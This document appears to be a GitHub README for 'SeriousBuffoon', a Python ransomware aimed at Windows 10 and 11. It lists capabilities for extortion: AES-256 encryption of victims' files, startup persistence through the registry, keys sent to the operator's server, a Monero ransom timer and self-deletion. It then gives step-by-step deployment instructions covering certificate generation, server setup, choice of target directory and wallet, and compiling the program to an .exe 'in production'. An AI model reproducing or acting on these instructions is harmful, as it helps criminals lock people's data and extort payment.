# ⚡⚡ SeriousBuffoon ⚡⚡


<img src="https://github.com/Chibraax/SeriousBuf00n/blob/main/Bin/GUI/images/joker.png" alt="Serious Buffoon" width="300" height="200">

Probably the best Python ransomware available on Github

 

## Features

- AES-256 bits encryption 
- Multi threaded encryption/decryption
- Encrypt big files chunk by chunk (test on a 36 GB file)
- Scrap on real time the value of the XMR on https://www.coingecko.com/
- Can adapt depending of the processor
- Send decryption key through TLS
- Awesome GUI write with Tkinter with useful options
- Unique ID for each victim 
- Victim can decrypt one file for free, to create a relationship of trust with the user 
- The decryption key for the free file is different from the rest of files
- Change the wallpapper and get back the old one after the decryption
- GUI with Timer
- Easily customisable with "const.py" file
- Create register KEY for launch the ransomware at every start up
- Clean itself, the ransomware delete all files after the decryption
- Tell the user how to buy moneros 
- Works on Windows 10 and Windows 11


## GUI

<img src="https://github.com/Chibraax/SeriousBuf00n/blob/main/Screenshot/1.png" alt="Serious Buffoon" width="1000" height="550">


 
# How to use SeriousBuffoon as .exe  

### Python 3.12.1 + 

### !! BE CAREFUL WITH Python 3.13+ BECAUSE OF THE GIL !! ###

## Server

+> ``cd SeriousBuff00n/Server/``

+> ``./auto_cert_gen.sh``

+> Edit ``server.py`` and the variables ``KEYFILE`` and ``CERTIFICATE`` by setting the path of these files

+> Edit your ``IP`` and ``PORT`` 

+> Run the server by taping ``python3 server.py`` . ( Maybe you'll need to install termcolor``pip3 install termcolor`` )

## Set up the virtual environment and install all the required packages

+> ```cd SeriousBuffoon/Bin```

+> create virtual env : ``py -m venv .venv``

+> activate the virtual env: ``.\.venv\Scripts\activate`` 

+> install libs: ``pip3 install -r ..\ressource\requierements.txt``

+> Edit the ``const.py`` file and the variable : ``DIR_TO_HIT`` to set where SeriousBuffoon should encrypt

+> Edit the ``const.py`` file and the variable : ``HOST``,``PORT`` to set your server and port

+> Compile the ransomware by type : ``pyinstaller build.spec``

+> You will find the .exe in ``SeriousBuff00n/Bin/dist`` folder

<b>Enjoy <3</b>

## To do:
 - [ ] Add a database (SQL) 
 - [ ] Bypass permission / Privileges Escalation (WinPwnage)
 - [ ] Compatible with linux
 - [ ] Find another way to check if ransomware had already ran


-----------------------------------------------------------------------------------------------------------------------------------------------------------------

## If when you try to change the .ico of the .exe it's not working :

- Try to just cut the file and past it to another dir
- Go to ``C:\Users\User\AppData\Local\Microsoft\Windows\Explorer``. Select all files that begin with iconcache and thumbcache and delete all these files
- Go to ``C:\Users\user\AppData\Local`` and delete ``IconCache.db``

## DONT FORGET 
- In production edit the ``EMAIL``,``MONERO_ADDRESS`` and ``PRICE_MONERO_EUR`` in ``const.py``.
- Add some files extensions on ``encryption/encrypt.py`` line 26.
- You can modify the ``build.spec`` if you want change the behaviour of the ransomware

-----------------------------------------------------------------------------------------------------------------------------------------------------------------
## If you like it Tips me ❤️
<img src="https://github.com/Chibraax/SeriousBuf00n---Ransomware/blob/main/Bin/GUI/images/monero.png" alt="Serious Buffoon" width="180" height="120">
Monero : 8AjPMwYakhxVfStZzKW34JNJD8Jnr3vBQ4CnTzcfRymNXJHUuZ4nRitT2nShynZzzpNXjRKofinL9BLYsQme1yiTDWyKT6r
